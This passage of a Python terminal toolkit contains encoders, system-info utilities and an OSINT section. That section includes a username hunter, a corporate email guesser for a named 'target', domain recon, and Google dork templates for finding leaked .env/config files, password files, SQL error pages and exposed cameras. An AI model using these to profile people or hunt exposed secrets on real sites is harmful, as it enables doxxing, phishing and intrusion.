    _log("B64", mode); _pause()

def enc_url():
    _header("URL ENCODE / DECODE")
    console.print("  [grey50]1[/grey50] encode  [grey50]2[/grey50] decode\n")
    mode = _ask("mode: ")
    data = _ask("input: ")
    try:
        if mode=="1": out = urllib.parse.quote(data, safe="")
        else:         out = urllib.parse.unquote(data)
        console.print(f"\n  [green]{out}[/green]")
    except Exception as e: _err(str(e))
    _log("URL_ENC", mode); _pause()

def enc_hash():
    _header("HASH GENERATOR")
    algos = ["md5","sha1","sha224","sha256","sha384","sha512"]
    for i,a in enumerate(algos,1): console.print(f"  [cyan]{i}[/cyan]  {a}")
    console.print(f"  [cyan]0[/cyan]  all\n")
    choice = _ask("select: ")
    data   = _ask("input string: ").encode()
    if choice=="0": sel=algos
    else:
        try: sel=[algos[int(choice)-1]]
        except: _err("invalid"); _pause(); return
    for a in sel:
        h = hashlib.new(a, data).hexdigest()
        console.print(f"  [cyan]{a:>8}[/cyan]  [white]{h}[/white]")
    _log("HASH", "+".join(sel)); _pause()

def enc_hex():
    _header("HEX ENCODE / DECODE")
    console.print("  [grey50]1[/grey50] str→hex  [grey50]2[/grey50] hex→str\n")
    mode = _ask("mode: ")
    data = _ask("input: ")
    try:
        if mode=="1": out = data.encode().hex()
        else:         out = bytes.fromhex(data).decode(errors="replace")
        console.print(f"\n  [green]{out}[/green]")
    except Exception as e: _err(str(e))
    _log("HEX", mode); _pause()

def enc_caesar():
    _header("CAESAR / ROT CIPHER")
    text  = _ask("text: ")
    shift = int(_ask("shift (ROT13 = 13): ") or "13")
    out   = ""
    for ch in text:
        if ch.isalpha():
            base = ord("A") if ch.isupper() else ord("a")
            out += chr((ord(ch) - base + shift) % 26 + base)
        else:
            out += ch
    console.print(f"\n  [green]{out}[/green]")
    _log("CAESAR", shift); _pause()

def enc_binary():
    _header("BINARY ENCODE / DECODE")
    console.print("  [grey50]1[/grey50] str→bin  [grey50]2[/grey50] bin→str\n")
    mode = _ask("mode: ")
    data = _ask("input: ")
    try:
        if mode=="1":
            out = " ".join(format(ord(c),"08b") for c in data)
        else:
            bits = data.replace(" ","")
            out  = "".join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
        console.print(f"\n  [green]{out}[/green]")
    except Exception as e: _err(str(e))
    _log("BIN", mode); _pause()

def enc_jwt_decode():
    _header("JWT DECODER  (no verify)")
    token = _ask("paste JWT: ")
    parts = token.split(".")
    if len(parts) < 2: _err("not a valid JWT"); _pause(); return
    for i,label in enumerate(["header","payload"]):
        part = parts[i]
        part += "=" * (-len(part)%4)
        try:
            decoded = json.loads(base64.urlsafe_b64decode(part))
            console.print(f"\n  [cyan]{label}[/cyan]")
            for k,v in decoded.items():
                console.print(f"    [grey50]{k:>20}[/grey50]  [white]{v}[/white]")
        except Exception as e: _err(f"{label}: {e}")
    _log("JWT_DECODE","ok"); _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 4 : SYSTEM INFO ─────────────────────────────────
# ═════════════════════════════════════════════════════════════

def sys_info():
    import platform
    _header("SYSTEM INFO")
    fields = {
        "os"        : platform.system(),
        "release"   : platform.release(),
        "version"   : platform.version(),
        "machine"   : platform.machine(),
        "processor" : platform.processor(),
        "hostname"  : socket.gethostname(),
        "local ip"  : socket.gethostbyname(socket.gethostname()),
        "python"    : platform.python_version(),
        "cwd"       : os.getcwd(),
        "user"      : os.environ.get("USERNAME") or os.environ.get("USER","?"),
    }
    for k,v in fields.items():
        console.print(f"  [cyan]{k:>12}[/cyan]  [white]{v}[/white]")
    _log("SYS_INFO","ok"); _pause()

def sys_env():
    _header("ENVIRONMENT VARIABLES")
    kw = _ask("filter keyword (blank=all): ").lower()
    for k,v in sorted(os.environ.items()):
        if kw and kw not in k.lower() and kw not in v.lower(): continue
        console.print(f"  [cyan]{k:>32}[/cyan]  [white]{v}[/white]")
    _log("ENV",kw or "all"); _pause()

def sys_extip():
    if not _need_req(): return
    _header("EXTERNAL IP")
    try:
        r = _session().get("https://ipinfo.io/json", timeout=8)
        d = r.json()
        for k in ["ip","city","region","country","org"]:
            if k in d: console.print(f"  [cyan]{k:>10}[/cyan]  [white]{d[k]}[/white]")
        _log("EXTIP", d.get("ip","?"))
    except Exception as e: _err(str(e))
    _pause()

def sys_processes():
    _header("RUNNING PROCESSES")
    cmd = "tasklist" if os.name=="nt" else "ps aux --sort=-%cpu | head -30"
    os.system(cmd)
    _log("PROCS","ok"); _pause()

def sys_diskinfo():
    _header("DISK USAGE")
    import shutil
    path = _ask("path (blank = current dir): ") or "."
    try:
        total, used, free = shutil.disk_usage(path)
        def _h(b): return f"{b/1024/1024/1024:.2f} GB"
        console.print(f"  [cyan]{'total':>10}[/cyan]  [white]{_h(total)}[/white]")
        console.print(f"  [cyan]{'used':>10}[/cyan]  [white]{_h(used)}[/white]")
        console.print(f"  [cyan]{'free':>10}[/cyan]  [green]{_h(free)}[/green]")
        pct = used/total*100
        bw  = 40
        fill= int(bw*pct/100)
        bar = "[magenta]"+"█"*fill+"[/magenta][grey50]"+"░"*(bw-fill)+"[/grey50]"
        console.print(f"  {bar}  {pct:.1f}% used")
    except Exception as e: _err(str(e))
    _log("DISK", path); _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 5 : FUN / MISC ───────────────────────────────────
# ═════════════════════════════════════════════════════════════

def misc_pwgen():
    _header("PASSWORD GENERATOR")
    try:
        length  = int(_ask("length (default 20): ") or "20")
        count   = int(_ask("how many (default 5): ") or "5")
    except: length,count = 20,5
    use_sym = _ask("include symbols? (Y/n): ").lower() != "n"
    charset = string.ascii_letters + string.digits
    if use_sym: charset += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    console.print()
    for i in range(count):
        pw = "".join(random.SystemRandom().choice(charset) for _ in range(length))
        # strength color
        has_up  = any(c.isupper() for c in pw)
        has_lo  = any(c.islower() for c in pw)
        has_dig = any(c.isdigit() for c in pw)
        has_sym = any(c in string.punctuation for c in pw)
        score   = sum([has_up,has_lo,has_dig,has_sym])
        col     = ["red","yellow","yellow","green","green"][score]
        console.print(f"  [{col}]{pw}[/{col}]")
    _log("PWGEN", f"{count}x{length}"); _pause()

def misc_uuid():
    _header("UUID GENERATOR")
    import uuid
    try: count = int(_ask("how many (default 5): ") or "5")
    except: count = 5
    for _ in range(count):
        console.print(f"  [white]{uuid.uuid4()}[/white]")
    _log("UUID", count); _pause()

def misc_lorem():
    _header("LOREM IPSUM GENERATOR")
    WORDS = ["lorem","ipsum","dolor","sit","amet","consectetur","adipiscing","elit",
             "sed","do","eiusmod","tempor","incididunt","ut","labore","et","dolore",
             "magna","aliqua","enim","ad","minim","veniam","quis","nostrud","exercitation"]
    try: paras = int(_ask("paragraphs (default 3): ") or "3")
    except: paras=3
    for _ in range(paras):
        sent_count = random.randint(4,8)
        para = []
        for _ in range(sent_count):
            wc   = random.randint(8,16)
            sent = " ".join(random.choice(WORDS) for _ in range(wc)).capitalize() + "."
            para.append(sent)
        console.print(f"\n  [white]{' '.join(para)}[/white]")
    _log("LOREM", paras); _pause()

def misc_timestamp():
    _header("TIMESTAMP CONVERTER")
    console.print("  [grey50]1[/grey50] now → all formats")
    console.print("  [grey50]2[/grey50] unix ts → human")
    console.print("  [grey50]3[/grey50] human → unix ts\n")
    mode = _ask("mode: ")
    if mode=="1":
        now = datetime.now(timezone.utc)
        console.print(f"  [cyan]{'unix':>12}[/cyan]  [white]{int(now.timestamp())}[/white]")
        console.print(f"  [cyan]{'iso8601':>12}[/cyan]  [white]{now.isoformat()}[/white]")
        console.print(f"  [cyan]{'human':>12}[/cyan]  [white]{now.strftime('%Y-%m-%d %H:%M:%S UTC')}[/white]")
        console.print(f"  [cyan]{'discord ts':>12}[/cyan]  [white]<t:{int(now.timestamp())}:F>[/white]")
    elif mode=="2":
        raw = _ask("unix timestamp: ")
        try:
            dt = datetime.fromtimestamp(int(raw), tz=timezone.utc)
            console.print(f"  [white]{dt.strftime('%Y-%m-%d %H:%M:%S UTC')}[/white]")
        except Exception as e: _err(str(e))
    elif mode=="3":
        raw = _ask("datetime (YYYY-MM-DD HH:MM:SS): ")
        try:
            dt = datetime.strptime(raw, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
            console.print(f"  [white]{int(dt.timestamp())}[/white]")
        except Exception as e: _err(str(e))
    _log("TIMESTAMP", mode); _pause()

def misc_char_counter():
    _header("TEXT ANALYZER")
    console.print("  [grey50]paste your text, blank line to analyze:[/grey50]\n")
    lines=[]
    while True:
        line=console.input("  ")
        if not line: break
        lines.append(line)
    text = "\n".join(lines)
    words   = len(text.split())
    chars   = len(text)
    chars_ns= len(text.replace(" ","").replace("\n",""))
    lines_n = len(lines)
    sentences = text.count(".")+text.count("!")+text.count("?")
    console.print(f"\n  [cyan]{'chars':>16}[/cyan]  [white]{chars}[/white]")
    console.print(f"  [cyan]{'chars (no space)':>16}[/cyan]  [white]{chars_ns}[/white]")
    console.print(f"  [cyan]{'words':>16}[/cyan]  [white]{words}[/white]")
    console.print(f"  [cyan]{'lines':>16}[/cyan]  [white]{lines_n}[/white]")
    console.print(f"  [cyan]{'sentences~':>16}[/cyan]  [white]{sentences}[/white]")
    console.print(f"  [cyan]{'avg word len':>16}[/cyan]  [white]{chars_ns/max(words,1):.1f}[/white]")
    _log("TEXT_ANALYZE", f"{chars}chars"); _pause()

def misc_color_picker():
    _header("COLOR CONVERTER")
    console.print("  [grey50]1[/grey50] hex → rgb  [grey50]2[/grey50] rgb → hex  [grey50]3[/grey50] random color\n")
    mode = _ask("mode: ")
    if mode=="1":
        h = _ask("hex (e.g. ff6b9d): ").lstrip("#")
        try:
            r,g,b = int(h[0:2],16),int(h[2:4],16),int(h[4:6],16)
            console.print(f"  [white]rgb({r}, {g}, {b})[/white]")
            console.print(f"  [rgb({r},{g},{b})]████████  this color[/rgb({r},{g},{b})]")
        except Exception as e: _err(str(e))
    elif mode=="2":
        try:
            r=int(_ask("R (0-255): ")); g=int(_ask("G: ")); b=int(_ask("B: "))
            console.print(f"  [white]#{r:02x}{g:02x}{b:02x}[/white]")
            console.print(f"  [rgb({r},{g},{b})]████████  this color[/rgb({r},{g},{b})]")
        except Exception as e: _err(str(e))
    else:
        r,g,b = random.randint(0,255),random.randint(0,255),random.randint(0,255)
        console.print(f"  [white]#{r:02x}{g:02x}{b:02x}  rgb({r},{g},{b})[/white]")
        console.print(f"  [rgb({r},{g},{b})]████████  this color[/rgb({r},{g},{b})]")
    _log("COLOR", mode); _pause()

def misc_log():
    _header("SESSION LOG")
    if not LOG: _info("no entries yet."); _pause(); return
    for ts,action,result in LOG:
        col = "green" if result in ("ok","200","204") else "red"
        console.print(f"  [grey50]{ts}[/grey50]  [cyan]{action:<22}[/cyan]  [{col}]{result}[/{col}]")
    console.print()
    if _ask("export to file? (y/N): ").lower()=="y":
        fname=f"vantira_log_{int(time.time())}.txt"
        with open(fname,"w") as f:
            for ts,a,r in LOG: f.write(f"{ts}\t{a}\t{r}\n")
        _ok(f"saved → {fname}")
    _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 6 : OSINT ───────────────────────────────────────
# ═════════════════════════════════════════════════════════════

# 50+ sites for username lookup — covers social, tech, gaming, forums
_USERNAME_SITES = [
    ("GitHub",        "https://github.com/{}"),
    ("GitLab",        "https://gitlab.com/{}"),
    ("Twitter/X",     "https://x.com/{}"),
    ("Instagram",     "https://www.instagram.com/{}"),
    ("TikTok",        "https://www.tiktok.com/@{}"),
    ("Reddit",        "https://www.reddit.com/user/{}"),
    ("YouTube",       "https://www.youtube.com/@{}"),
    ("Twitch",        "https://www.twitch.tv/{}"),
    ("Pinterest",     "https://www.pinterest.com/{}"),
    ("Tumblr",        "https://www.tumblr.com/{}"),
    ("Medium",        "https://medium.com/@{}"),
    ("Dev.to",        "https://dev.to/{}"),
    ("Pastebin",      "https://pastebin.com/u/{}"),
    ("Replit",        "https://replit.com/@{}"),
    ("Codepen",       "https://codepen.io/{}"),
    ("HackerNews",    "https://news.ycombinator.com/user?id={}"),
    ("ProductHunt",   "https://www.producthunt.com/@{}"),
    ("SoundCloud",    "https://soundcloud.com/{}"),
    ("Spotify",       "https://open.spotify.com/user/{}"),
    ("Steam",         "https://steamcommunity.com/id/{}"),
    ("Roblox",        "https://www.roblox.com/user.aspx?username={}"),
    ("Minecraft",     "https://namemc.com/profile/{}"),
    ("Xbox",          "https://xboxgamertag.com/search/{}"),
    ("PSN",           "https://psnprofiles.com/{}"),
    ("Chess.com",     "https://www.chess.com/member/{}"),
    ("Lichess",       "https://lichess.org/@/{}"),
    ("Keybase",       "https://keybase.io/{}"),
    ("HackerOne",     "https://hackerone.com/{}"),
    ("Bugcrowd",      "https://bugcrowd.com/{}"),
    ("DockerHub",     "https://hub.docker.com/u/{}"),
    ("NPM",           "https://www.npmjs.com/~{}"),
    ("PyPI",          "https://pypi.org/user/{}"),
    ("Behance",       "https://www.behance.net/{}"),
    ("Dribbble",      "https://dribbble.com/{}"),
    ("Fiverr",        "https://www.fiverr.com/{}"),
    ("Etsy",          "https://www.etsy.com/shop/{}"),
    ("Linktree",      "https://linktr.ee/{}"),
    ("About.me",      "https://about.me/{}"),
    ("Gravatar",      "https://gravatar.com/{}"),
    ("Disqus",        "https://disqus.com/by/{}"),
    ("Flipboard",     "https://flipboard.com/@{}"),
    ("Quora",         "https://www.quora.com/profile/{}"),
    ("VK",            "https://vk.com/{}"),
    ("Telegram",      "https://t.me/{}"),
    ("CashApp",       "https://cash.app/${}"),
    ("Venmo",         "https://venmo.com/{}"),
    ("Ko-fi",         "https://ko-fi.com/{}"),
    ("Patreon",       "https://www.patreon.com/{}"),
    ("OnlyFans",      "https://onlyfans.com/{}"),
    ("Substack",      "https://substack.com/@{}"),
]

def osint_username():
    if not _need_req(): return
    _header("USERNAME LOOKUP")
    username = _ask("username to hunt: ")
    if not username: _err("no username"); _pause(); return

    found   = []
    not_found = []
    errors  = []
    lock    = threading.Lock()
    q       = Queue()
    for site in _USERNAME_SITES:
        q.put(site)

    THREADS = 20
    console.print(f"\n  [grey50]scanning {len(_USERNAME_SITES)} sites with {THREADS} threads...[/grey50]\n")
    done_count = [0]

    def worker():
        s = _session()
        s.max_redirects = 3
        while True:
            try: site_name, url_tpl = q.get_nowait()
            except: return
            url = url_tpl.format(username)
            try:
                r = s.get(url, timeout=7, allow_redirects=True)
                # 200 = likely exists; 404/410 = gone; others = ambiguous
                with lock:
                    done_count[0] += 1
                    if r.status_code == 200:
                        found.append((site_name, url))
                    elif r.status_code in (404, 410):
                        not_found.append(site_name)
                    else:
                        errors.append((site_name, r.status_code))
            except Exception as e:
                with lock:
                    done_count[0] += 1
                    errors.append((site_name, str(e)[:30]))
            q.task_done()

    pool = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
    for t in pool: t.start()

    # live progress bar while scanning
    total = len(_USERNAME_SITES)
    while not q.empty() or any(t.is_alive() for t in pool):
        done = done_count[0]
        bw   = 36
        fill = int(bw * done / max(total, 1))
        bar  = "[magenta]" + "█"*fill + "[/magenta][grey50]" + "░"*(bw-fill) + "[/grey50]"
        console.print(f"\r  {bar} {done}/{total}  "
                      f"[green]{len(found)}✓[/green] [red]{len(not_found)}✗[/red]", end="")
        time.sleep(0.15)
    for t in pool: t.join()
    console.print()

    # results
    if found:
        console.print(f"\n  [bold green]FOUND on {len(found)} platform(s):[/bold green]\n")
        for name, url in found:
            console.print(f"  [green]✓[/green]  [bold white]{name:<18}[/bold white]  [blue]{url}[/blue]")
    else:
        console.print(f"\n  [red]not found on any platform[/red]")

    if errors:
        console.print(f"\n  [grey50]errors ({len(errors)} sites — timeouts/blocks):[/grey50]")
        for name, reason in errors:
            console.print(f"  [grey50]  {name:<18}  {reason}[/grey50]")

    # export option
    console.print()
    if _ask("export results to file? (y/N): ").lower() == "y":
        fname = f"vantira_osint_{username}_{int(time.time())}.txt"
        with open(fname, "w") as f:
            f.write(f"Vantira Username OSINT — {username}\n")
            f.write(f"Scanned: {datetime.now()}\n\n")
            f.write("=== FOUND ===\n")
            for name, url in found:
                f.write(f"{name:<20}  {url}\n")
            f.write("\n=== NOT FOUND ===\n")
            for name in not_found:
                f.write(f"{name}\n")
        _ok(f"saved → {fname}")

    _log("USERNAME_OSINT", f"{username} → {len(found)} found")
    _pause()


def osint_dork():
    _header("GOOGLE DORK BUILDER")
    console.print("  [grey50]build a dork step by step, then get the search URL[/grey50]\n")

    DORK_TEMPLATES = {
        "1": ("Site search",           'site:{} {}'),
        "2": ("File type hunt",        'site:{} filetype:{} {}'),
        "3": ("Login page finder",     'site:{} inurl:{} intitle:login'),
        "4": ("Exposed directories",   'site:{} intitle:"index of" {}'),
        "5": ("Config/env file leak",  'site:{} ext:env OR ext:cfg OR ext:config {}'),
        "6": ("Subdomain enum",        'site:*.{} -www {}'),
        "7": ("Camera / IoT",          'inurl:"/view/index.shtml" {}'),
        "8": ("SQL error pages",       'site:{} "sql syntax" OR "mysql error" OR "ORA-" {}'),
        "9": ("Password files",        'site:{} filetype:txt inurl:password {}'),
        "0": ("Custom (free form)",    '{}'),
    }

    for k, (name, _) in DORK_TEMPLATES.items():
        console.print(f"  [cyan]{k}[/cyan]  {name}")
    console.print()

    choice = _ask("select template: ")
    if choice not in DORK_TEMPLATES:
        _err("invalid"); _pause(); return

    name, tpl = DORK_TEMPLATES[choice]
    placeholders = tpl.count("{}")
    _info(f"template: [white]{tpl}[/white]")

    fills = []
    labels = {
        1: ["domain/site"],
        2: ["domain/site", "extension (pdf/xls/docx)", "extra keywords"],
        3: ["domain/site", "url keyword (admin/login/portal)"],
        4: ["domain/site", "extra keywords"],
        5: ["domain/site", "extra keywords"],
        6: ["domain (example.com)", "extra keywords"],
        7: ["location or keyword"],
        8: ["domain/site", "extra keywords"],
        9: ["domain/site", "extra keywords"],
        0: ["full dork query"],
    }.get(int(choice), [f"field {i+1}" for i in range(placeholders)])

    for i in range(placeholders):
        label = labels[i] if i < len(labels) else f"field {i+1}"
        fills.append(_ask(f"  {label}: "))

    # build the dork
    dork = tpl
    for fill in fills:
        dork = dork.replace("{}", fill, 1)

    encoded  = urllib.parse.quote(dork)
    gurl     = f"https://www.google.com/search?q={encoded}"
    ddg_url  = f"https://duckduckgo.com/?q={encoded}"
    bing_url = f"https://www.bing.com/search?q={encoded}"

    console.print(f"\n  [bold white]dork:[/bold white]  [yellow]{dork}[/yellow]\n")
    console.print(f"  [cyan]Google :[/cyan]  {gurl}")
    console.print(f"  [cyan]DDG    :[/cyan]  {ddg_url}")
    console.print(f"  [cyan]Bing   :[/cyan]  {bing_url}")

    # try to auto-open in browser
    if _ask("\n  open in browser? (y/N): ").lower() == "y":
        import webbrowser
        webbrowser.open(gurl)
        _ok("opened in browser")

    _log("DORK", dork[:60])
    _pause()


def osint_email_guess():
    _header("EMAIL FORMAT GUESSER")
    console.print("  [grey50]generates likely corporate email formats for a target[/grey50]\n")
    first  = _ask("first name: ").lower().strip()
    last   = _ask("last name: ").lower().strip()
    domain = _ask("company domain (e.g. google.com): ").lower().strip()

    if not all([first, last, domain]):
        _err("fill all fields"); _pause(); return

    f, l  = first, last
    fi    = f[0]   # first initial
    li    = l[0]   # last initial

    formats = [
        f"{f}@{domain}",
        f"{l}@{domain}",
        f"{f}.{l}@{domain}",
        f"{f}{l}@{domain}",
        f"{fi}{l}@{domain}",
        f"{f}{li}@{domain}",
        f"{fi}.{l}@{domain}",
        f"{l}.{f}@{domain}",
        f"{l}{fi}@{domain}",
        f"{f}_{l}@{domain}",
        f"{l}_{f}@{domain}",
        f"{fi}{li}@{domain}",
        f"{f}-{l}@{domain}",
        f"{l}-{f}@{domain}",
        f"{f}.{li}@{domain}",
        f"{fi}.{li}@{domain}",
    ]

    console.print(f"\n  [bold white]{len(formats)} possible formats for [magenta]{first} {last}[/magenta] @ [cyan]{domain}[/cyan]:[/bold white]\n")
    for i, email in enumerate(formats, 1):
        console.print(f"  [grey50]{i:>2}[/grey50]  [green]{email}[/green]")

    console.print()
    if _ask("export to file? (y/N): ").lower() == "y":
        fname = f"emails_{first}_{last}_{int(time.time())}.txt"
        with open(fname, "w") as fh:
            for email in formats: fh.write(email + "\n")
        _ok(f"saved → {fname}")

    _log("EMAIL_GUESS", f"{first}.{last}@{domain}")
    _pause()


def osint_domain_recon():
    if not _need_req(): return
    _header("DOMAIN FULL RECON")
    console.print("  [grey50]runs DNS + IP info + HTTP headers + tech hints all at once[/grey50]\n")
    domain = _ask("domain (e.g. example.com): ").strip().lstrip("https://").lstrip("http://").split("/")[0]

    console.print(f"\n  [bold magenta]── DNS ─────────────────────────────[/bold magenta]")
    try:
        ip = socket.gethostbyname(domain)
        console.print(f"  [cyan]{'A':>10}[/cyan]  [white]{ip}[/white]")
    except Exception as e:
        _err(f"DNS resolve failed: {e}"); _pause(); return

    try:
        fqdn = socket.getfqdn(domain)
        console.print(f"  [cyan]{'FQDN':>10}[/cyan]  [white]{fqdn}[/white]")
    except: pass

    try:
        ai6 = socket.getaddrinfo(domain, None, socket.AF_INET6)
        if ai6: console.print(f"  [cyan]{'AAAA':>10}[/cyan]  [white]{ai6[0][4][0]}[/white]")
    except: pass

    console.print(f"\n  [bold magenta]── IP WHOIS ─────────────────────────[/bold magenta]")
    try:
        r = _session().get(f"https://ipinfo.io/{ip}/json", timeout=8)
        d = r.json()
        for field in ["ip","hostname","city","region","country","org","timezone"]:
            if field in d:
                console.print(f"  [cyan]{field:>10}[/cyan]  [white]{d[field]}[/white]")
    except Exception as e: _warn(f"ipinfo failed: {e}")

    console.print(f"\n  [bold magenta]── HTTP HEADERS ─────────────────────[/bold magenta]")
    try:
        r = _session().get(f"https://{domain}", timeout=8, allow_redirects=True)
        security_headers = [
            "server","x-powered-by","content-security-policy",
            "strict-transport-security","x-frame-options",
            "x-xss-protection","x-content-type-options",
            "referrer-policy","permissions-policy","set-cookie",
        ]
        for h in security_headers:
            val = r.headers.get(h)
            if val:
                col = "green" if h in ("strict-transport-security","content-security-policy",
                                        "x-frame-options","x-content-type-options") else "white"
                console.print(f"  [cyan]{h:>30}[/cyan]  [{col}]{val[:70]}[/{col}]")
            else:
                if h in ("strict-transport-security","content-security-policy","x-frame-options"):
                    console.print(f"  [red]{h:>30}[/red]  [grey50]MISSING ← potential weakness[/grey50]")
        # tech fingerprint from headers
        console.print(f"\n  [bold magenta]── TECH HINTS ───────────────────────[/bold magenta]")
        hints = []
        hdrs  = {k.lower():v.lower() for k,v in r.headers.items()}
        if "php" in str(hdrs):                hints.append("PHP")
        if "asp" in str(hdrs):                hints.append("ASP.NET")
        if "django" in str(hdrs):             hints.append("Django")
        if "express" in str(hdrs):            hints.append("Express.js")
        if "nginx"  in hdrs.get("server",""):  hints.append("nginx")
        if "apache" in hdrs.get("server",""):  hints.append("Apache")
        if "cloudflare" in str(hdrs):         hints.append("Cloudflare")
        if "amazonaws" in str(hdrs):          hints.append("AWS")
        if "vercel"  in str(hdrs):            hints.append("Vercel")
        if hints:
            console.print(f"  [yellow]detected: {', '.join(hints)}[/yellow]")
        else:
            console.print(f"  [grey50]no obvious fingerprints in headers[/grey50]")
    except Exception as e: _warn(f"HTTP recon failed: {e}")

    _log("DOMAIN_RECON", domain)
    _pause()


def osint_reverse_image():
    _header("REVERSE IMAGE SEARCH LINKS")
    console.print("  [grey50]paste an image URL — generates search links for all major engines[/grey50]\n")
    img_url = _ask("image url: ").strip()
    if not img_url:
        _err("no url"); _pause(); return

    enc = urllib.parse.quote(img_url, safe="")
    engines = [
        ("Google Images",   f"https://www.google.com/searchbyimage?image_url={enc}"),
        ("TinEye",          f"https://tineye.com/search?url={enc}"),
        ("Yandex Images",   f"https://yandex.com/images/search?url={enc}&rpt=imageview"),
        ("Bing Visual",     f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}"),
        ("CTPH (ImgOps)",   f"https://imgops.com/{img_url}"),
    ]

    console.print(f"  [bold white]reverse search links:[/bold white]\n")
    for name, url in engines:
        console.print(f"  [cyan]{name:<20}[/cyan]  [blue]{url}[/blue]")

    if _ask("\n  open all in browser? (y/N): ").lower() == "y":
        import webbrowser
        for _, url in engines:
            webbrowser.open(url)
            time.sleep(0.3)
        _ok("opened all")

    _log("REV_IMG", img_url[:60])
    _pause()


def osint_phone():
    if not _need_req(): return
    _header("PHONE NUMBER INFO")
    console.print("  [grey50]basic carrier/region lookup via numverify-style public API[/grey50]\n")
    number = _ask("phone number (e.g. +14155552671): ").strip().replace(" ","").replace("-","")

    # parse what we can locally first
    if number.startswith("+"):
        country_code = number[1:3]
        cc_map = {
            "1":"US/Canada","44":"UK","33":"France","49":"Germany",
            "81":"Japan","82":"Korea","86":"China","91":"India",
            "7":"Russia","55":"Brazil","61":"Australia","52":"Mexico",
            "34":"Spain","39":"Italy","31":"Netherlands","46":"Sweden",
            "47":"Norway","45":"Denmark","41":"Switzerland","32":"Belgium",
        }
        region = cc_map.get(number[1:3]) or cc_map.get(number[1:2]) or "Unknown"
        console.print(f"  [cyan]{'number':>14}[/cyan]  [white]{number}[/white]")
        console.print(f"  [cyan]{'country code':>14}[/cyan]  [white]+{country_code}[/white]")
        console.print(f"  [cyan]{'region':>14}[/cyan]  [white]{region}[/white]")
        console.print(f"  [cyan]{'length':>14}[/cyan]  [white]{len(number)-1} digits[/white]")

        # generate search links
        enc = urllib.parse.quote(number)
        console.print(f"\n  [bold white]lookup links:[/bold white]")
        links = [
            ("Truecaller",   f"https://www.truecaller.com/search/us/{number.replace('+','')}"),
            ("SpamCalls",    f"https://spamcalls.net/en/search?q={enc}"),
            ("Google",       f"https://www.google.com/search?q={enc}"),
        ]
        for name, url in links:
            console.print(f"  [cyan]{name:<14}[/cyan]  [blue]{url}[/blue]")
    else:
        _warn("include country code with + prefix for best results")

    _log("PHONE", number)
    _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 7 : DISCORD OSINT ───────────────────────────────
# ═════════════════════════════════════════════════════════════

# Discord epoch: all snowflakes are ms since 2015-01-01T00:00:00Z
_DISCORD_EPOCH = 1420070400000

def _snowflake_to_dt(snowflake_id: int) -> datetime:
    """Extract creation timestamp from any Discord snowflake ID."""
    ms = (snowflake_id >> 22) + _DISCORD_EPOCH
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc)

def _fmt_dt(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%d %H:%M:%S UTC")

# Discord badge flag map (public_flags bitmask)
_BADGE_FLAGS = {
    1       : "Discord Staff",
    2       : "Discord Partner",
    4       : "HypeSquad Events",
    8       : "Bug Hunter Lvl 1",
    64      : "HypeSquad Bravery",
    128     : "HypeSquad Brilliance",
    256     : "HypeSquad Balance",
    512     : "Early Supporter",
    16384   : "Bug Hunter Lvl 2",
    131072  : "Verified Bot Developer",
    4194304 : "Active Developer",
}

# Verification level map
_VERIFY_LEVELS = {0:"None",1:"Low",2:"Medium",3:"High",4:"Very High"}
_NSFW_LEVELS   = {0:"Default",1:"Explicit",2:"Safe",3:"Age Restricted"}
_MFA_LEVELS    = {0:"None",1:"Elevated (2FA required)"}


def disc_user_lookup():
    if not _need_req(): return
    _header("DISCORD USER LOOKUP")
    console.print("  [grey50]snowflake decode is always free — bot token unlocks full profile[/grey50]\n")
    uid = _ask("Discord user ID (snowflake): ").strip()

    try:
        uid_int = int(uid)
    except:
        _err("invalid snowflake ID"); _pause(); return

    # ── snowflake decode (always works, no token needed) ──────
    created  = _snowflake_to_dt(uid_int)
    age_days = (datetime.now(timezone.utc) - created).days
    shard    = (uid_int >> 22) % 1000

    console.print(f"\n  [bold magenta]── SNOWFLAKE DATA ───────────────────[/bold magenta]")
    console.print(f"  [cyan]{'user id':>18}[/cyan]  [white]{uid}[/white]")
    console.print(f"  [cyan]{'created':>18}[/cyan]  [white]{_fmt_dt(created)}[/white]")
    console.print(f"  [cyan]{'account age':>18}[/cyan]  [white]{age_days} days  ({age_days//365}y {(age_days%365)//30}m)[/white]")
    console.print(f"  [cyan]{'shard id':>18}[/cyan]  [white]{shard}[/white]")
    console.print(f"  [cyan]{'discord ts':>18}[/cyan]  [white]<t:{int(created.timestamp())}:F>[/white]")

    # ── optional bot token for full profile ───────────────────
    console.print()
    bot_token = _ask("bot token for full profile (blank = skip): ").strip()

    if not bot_token:
        _info("no token provided — snowflake data above is all we got")
        _log("DISC_USER", f"{uid} snowflake-only")
        _pause(); return

    console.print(f"\n  [bold magenta]── API PROFILE DATA ─────────────────[/bold magenta]")
    try:
        auth = f"Bot {bot_token}" if not bot_token.startswith("Bot ") else bot_token
        r = _session().get(
            f"https://discord.com/api/v10/users/{uid}",
            headers={"Authorization": auth},
            timeout=8
        )
        if r.status_code == 200:
            d           = r.json()
            username    = d.get("username","?")
            discrim     = d.get("discriminator","0")
            tag         = f"{username}#{discrim}" if discrim != "0" else f"@{username}"
            global_name = d.get("global_name","")
            flags       = d.get("public_flags", 0)
            is_bot      = d.get("bot", False)
            avatar      = d.get("avatar","")
            banner      = d.get("banner","")
            accent      = d.get("accent_color")

            console.print(f"  [cyan]{'tag':>18}[/cyan]  [bold white]{tag}[/bold white]")
            if global_name:
                console.print(f"  [cyan]{'display name':>18}[/cyan]  [white]{global_name}[/white]")
            console.print(f"  [cyan]{'bot':>18}[/cyan]  [{'red' if is_bot else 'green'}]{is_bot}[/{'red' if is_bot else 'green'}]")

            badges = [bname for bit, bname in _BADGE_FLAGS.items() if flags & bit]
            if badges:
                console.print(f"  [cyan]{'badges':>18}[/cyan]  [yellow]{', '.join(badges)}[/yellow]")
            else:
                console.print(f"  [cyan]{'badges':>18}[/cyan]  [grey50]none[/grey50]")

            if avatar:
                ext     = "gif" if avatar.startswith("a_") else "png"
